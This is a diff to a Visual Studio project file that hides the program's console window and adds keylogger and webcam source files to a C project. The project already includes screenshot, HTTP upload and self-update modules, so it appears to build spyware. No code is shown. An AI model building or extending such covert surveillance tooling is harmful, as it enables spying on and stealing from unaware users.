@@ -93,7 +93,7 @@
       <BufferSecurityCheck>false</BufferSecurityCheck>
     </ClCompile>
     <Link>
-      <SubSystem>Console</SubSystem>
+      <SubSystem>Windows</SubSystem>
       <EnableCOMDATFolding>true</EnableCOMDATFolding>
       <OptimizeReferences>true</OptimizeReferences>
       <GenerateDebugInformation>true</GenerateDebugInformation>
@@ -133,6 +133,7 @@
     <ClCompile Include="functions.c" />
     <ClCompile Include="hash.c" />
     <ClCompile Include="http_upload.c" />
+    <ClCompile Include="keylogger.c" />
     <ClCompile Include="log.c" />
     <ClCompile Include="main.c" />
     <ClCompile Include="header.h" />
@@ -143,6 +144,7 @@
     <ClCompile Include="screenshot.c" />
     <ClCompile Include="unicode.c" />
     <ClCompile Include="update_exe.c" />
+    <ClCompile Include="webcame.c" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
